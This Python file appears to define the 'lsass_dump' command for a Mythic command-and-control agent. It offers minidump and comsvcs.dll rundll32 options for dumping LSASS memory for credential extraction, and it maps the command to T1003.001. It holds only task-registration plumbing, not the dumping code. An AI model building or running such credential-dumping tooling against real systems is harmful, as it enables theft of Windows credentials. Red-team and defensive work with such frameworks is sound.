from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class LsassDumpArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="method",
                type=ParameterType.ChooseOne,
                choices=["minidump", "comsvcs"],
                default_value="minidump",
                description="Dump method: MiniDumpWriteDump API or comsvcs.dll rundll32",
            ),
            CommandParameter(
                name="dump_path",
                type=ParameterType.String,
                default_value="",
                description="Output file path for the dump (auto-generated if empty)",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0 and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)


class LsassDumpCommand(CommandBase):
    cmd = "lsass_dump"
    needs_admin = True
    help_cmd = "lsass_dump -method minidump [-dump_path C:\\Windows\\Temp\\out.dmp]"
    description = "Dump LSASS process memory for credential extraction"
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1003.001"]
    argument_class = LsassDumpArguments
    attributes = CommandAttributes(builtin=False, supported_os=[SupportedOS.Windows])

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )
        method = taskData.args.get_arg("method")
        dump_path = taskData.args.get_arg("dump_path")
        response.DisplayParams = method + (" -> " + dump_path if dump_path else "")
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
